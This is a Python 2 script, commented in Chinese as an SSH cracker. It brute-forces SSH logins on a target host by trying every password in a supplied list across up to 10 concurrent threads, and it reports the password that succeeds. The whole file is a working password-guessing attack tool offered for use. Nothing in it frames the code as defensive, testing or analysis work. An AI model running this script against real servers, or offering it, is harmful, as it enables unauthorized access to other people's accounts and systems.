#!/usr/bin/env python
#encoding=utf-8
#使用pxssh破解ssh

import pxssh
import optparse
import time
import threading 

maxConnections = 10
Found = False
Fails = 0

connection_lock = threading.BoundedSemaphore(value = maxConnections)

def connect(host,user,password,release):
    global Found 
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception,e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -P <password list>')
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    parser.add_option('-P',dest='passwdFile',type='string',help='specify targer password list file')

    (options,args) = parser.parse_args()

    host = options.host
    user = options.user
    passwdFile = options.passwdFile

    if host == None or user == None or passwdFile == None:
        print parser.usage
        exit(0)

    fn = open(passwdFile,'r')
    for line in fn.readlines():
        if Found:
            print '[*] Exiting: Password Found'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: Too Mang Socket Timeouts'
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print '[-] Testing: ' + str(password)
        t = threading.Thread(target=connect,args=(host,user,password,True))
        child=t.start()

if __name__ == '__main__':
    main()
